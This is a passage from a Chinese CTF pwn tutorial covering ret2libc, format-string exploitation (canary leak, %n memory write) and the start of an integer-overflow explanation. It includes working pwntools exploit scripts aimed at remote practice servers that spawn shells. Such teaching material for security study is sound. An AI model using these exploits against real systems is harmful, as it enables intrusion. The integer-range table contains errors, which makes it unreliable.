    p.send(payload)
    p.recvuntil('\x0a')
    # 获取返回地址
    addr_read = p.recv()[:-1]
    addr_read = u64(addr_read.ljust(8,'\x00'))
    # 获取 libc 中的 system 中的函数
    libc = LibcSearcher('read',addr_read)
    addr_base = addr_read - libc.dump('read')
    addr_sys = addr_base + libc.dump('system')
    addr_sh = addr_base + libc.dump('str_bin_sh')
    payload = 'A' * 72 + p64(addr_pop_rdi) + p64(addr_sh) + p64(addr_sys) + p64(addr_main) + 'A' * 96
    p.send(payload)
    p.interactive()
# **格式化字符串漏洞**
**原理**
格式化字符串函数是指一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。C语言中使用到格式化字符串的输出函数主要有`printf
fprintf sprintf vprintf vfprint vsprintf` 等。以`printf`函数为例，介绍格式化字符串漏洞的原理及利用。
`printf`函数的声明如下：
    intprintf ( constchar*format, ... );
`printf`是一个变参函数，其实第一个参数就是格式化字符串，后面作为传入的参数将会根据格式化字符串的形式进行不同方式的解析并输出。其中在`format`中可以包含以转换指示符`%`为开头的格式化标签(format
specifiers) ，格式化标签可以被后面传入的附加参数的值替换，并按需求进行格式化。格式化标签的使用形式是：
    %[flags][width][.precision][length]specifier
这里主要介绍 pwn 中常用到的转换指示符：
指示符 | 输出格式  
---|---  
%d | 十进制整型  
%u | 十进制无符号整型  
%x | 十六进制无符号整型  
%p | 指针地址  
%s | 字符串形式  
%n | 无内容输出，但是会将已经输出的字节数写入到传入的指针指向的地址  
正常调用函数的情况下，在格式化字符串中包含的指示符数量`%`，应该与后面传入参数的数量相等。在格式化字符串匹配参数时，会按照调用函数的传参顺序逐一匹配。
我们可以通过观察调用函数时栈的情况来了解格式化字符串中指示符和其他参数的对应情况。
source.c ：
    #include 
    void main(){     
        printf("%x\n%x\n%x\n%x\n%x\n%x\n%3$x\n",  
           0x11111111, 0x22222222, 0x33333333, 0x44444444, 0x55555555,                0x66666666);
    }
32位程序的传参情况如下：
输出：
    11111111
    22222222
    33333333
    44444444
    55555555
    66666666
    33333333
32位情况下，参数有栈传递，需格式化输出的参数都在存在在栈空间和格式化字符串相邻。这里介绍`%3$x`，表示输出格式化字符串后面的第三个参数。
64位程序的传参情况：
输出结果同32位程序。
得出结论：格式化字符串存放在`rdi`寄存器中，格式化字符串后的前五个参数对应存放在 `rsi rdx rcx r8
r9`，第六个之后的参数会入栈，以此类推。
在非正常调用格式化输出函数的情况下，会出现以下的代码：
    voidmain(){
        char* str = NULL;
        scanf("%s",str);
        printf(str);
    }
这样直接将格式化字符串暴露出来，可以通过构造特定形式的输入字符串达到泄露栈上信息和任意修改内存的效果。
**利用1：泄露信息**
向程序输入如`%x%x%x%x%x%x`便可获取到栈帧中并不属于`printf`函数的栈数据。如果计算好偏移，创建的可以获取到的信息有：数据的存放地址、函数地址、canary值等。
通过攻防世界题 Mary_Morton 的利用可以通过格式化字符串漏洞进行`canary`保护的绕过。关于 canary 保护的介绍可以查看 CTF-Wiki 的文章：`https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/`
查看保护：
主要逻辑：
可以发现有一个格式化字符串漏洞：
还有一个栈溢出漏洞：
因为有 canary 保护，栈溢出漏洞无法直接使用填充字符覆盖到返回地址，需要绕过 canary 保护。在此可以通过格式化字符串漏洞泄露 canary
值，然后在 shellcode 中伪造 canary 值进行绕过。
在调用`printf`之前下断点，断下来后查看栈空间如下图。可以看到 canary 在栈空间偏移 0x11
个参数的位置，由于是64位的程序，加上6个寄存器传参，canary 的位置距离第一个参数偏移是
23，所以构造传给`printf`的参数为`"%23$p"`。泄露出 canary 之后用于构造栈溢出的 shellcode，达到绕过的效果。
EXP如下：
    from pwn import *
    p = remote("111.200.241.244",51032)
    p.sendlineafter("3. Exit the battle",'2')
    payload1 = '%23$p'
    p.sendline(payload1)
    p.recvuntil('0x')
    canary = int(p.recv()[:16],16)
    print "output: " + str(canary)
    canary_offset = 0x88
    ret_offset = 0x98
    get_flag_fun = 0x00000000004008DA
    payload2 = canary_offset * 'a' + p64(canary) + (ret_offset-canary_offset-8)*'a' + p64(get_flag_fun)
    p.sendlineafter("3. Exit the battle","1")
    p.sendline(payload2)
    p.interactive()
**利用2：修改内存**
可以通过攻防世界的一道 pwn 练习题-实时数据检测来了解。
题目关键逻辑如下：
大概逻辑是，判断存放在内存中 key 的值与 35795746 进行对比，如果相等则直接可以 get shell，但是正常逻辑下，key
是一个不受输入影响的值。但是可以发现`imagemagic`函数中出现在格式化漏洞，题目设计得恰好可以通过利用这漏洞进行对 key 的修改。查看`rip
== call printf 语句的地址`时的栈，可以看到 key 的地址在离格式化字符串偏移为 16 的位置上。所以给 printf
传递的格式化字符串的值为`"%35795746x%16$n","0x0804A048"`，指的是将一个十六进制数以 35795746
个字节的方式输出，输出的 35795746 个字节数写入到 `0x0804A048`指向的地址，即 key 的地址。从而达到了对 key 值进行修改的目的。
exp 如下：
    from pwn import *
    p = remote("111.200.241.244",48715)
    key_addr = 0x0804A048
    payload = '%35795746x%16$n\x00' + p32(0x0804A048)
    p.sendline(payload)
    p.interactive()
# **整数溢出漏洞**
**原理**
整数溢出是指：在计算机编程中，当算术运算试图创建一个超出可以用给定位数表示的范围（高于最大值或低于可表示的最小值）的数值时，就会发生整数溢出。了解整数溢出，需先了解整型数据在内存中的存储形式。
下表列出C语言中个整型数据的数值范围和分配的内存字节数（与编译器相关，以下是64位的值）：
类型说明符 | 数值范围 | 字节数  
---|---|---  
int | -32768~32767 (0x80000000~0x7fffffff) | 4  
unsigned int | 0~4294967295 (0~0xffffffff) | 4  
short int | -32768~32767 (0x8000~0x7ffff) | 2  
unsigned short int | 0~65535 (0~0xffff) | 2  
long int | -2147483648~2147483647 (0x8000000000000000~0x7fffffffffffffff) | 8  
unsigned long | 0~4294967295 (0~0xffffffffffffffff) | 8  
整数溢出的利用因为只能改变固定字节的输入，所以无法造成代码执行的效果。整数溢出漏洞需要配合程序的另一处的缺陷，才能达到利用的目的。通过输入能控制的程序中的数值（通常为输入的字符串的长度），用于处理与内存操作相关的限制或界限，便可能通过控制数值，设计缓冲区溢出，达到控制程序执行流程。笔者总结相关造成溢出的原因主要是
**对数值运算结果范围的错估** 和 **存在缺陷的类型转换** 。
《CTF竞赛权威指南》中，将整数的异常情况分为三种：溢出，回绕和截断。有符号整数发生的是溢出，对应字节数的有符号整数，最大值 + 1，会成为最小值， 最小值
-1 会成为最大值，此种情况可能绕过`>0 或 
* * *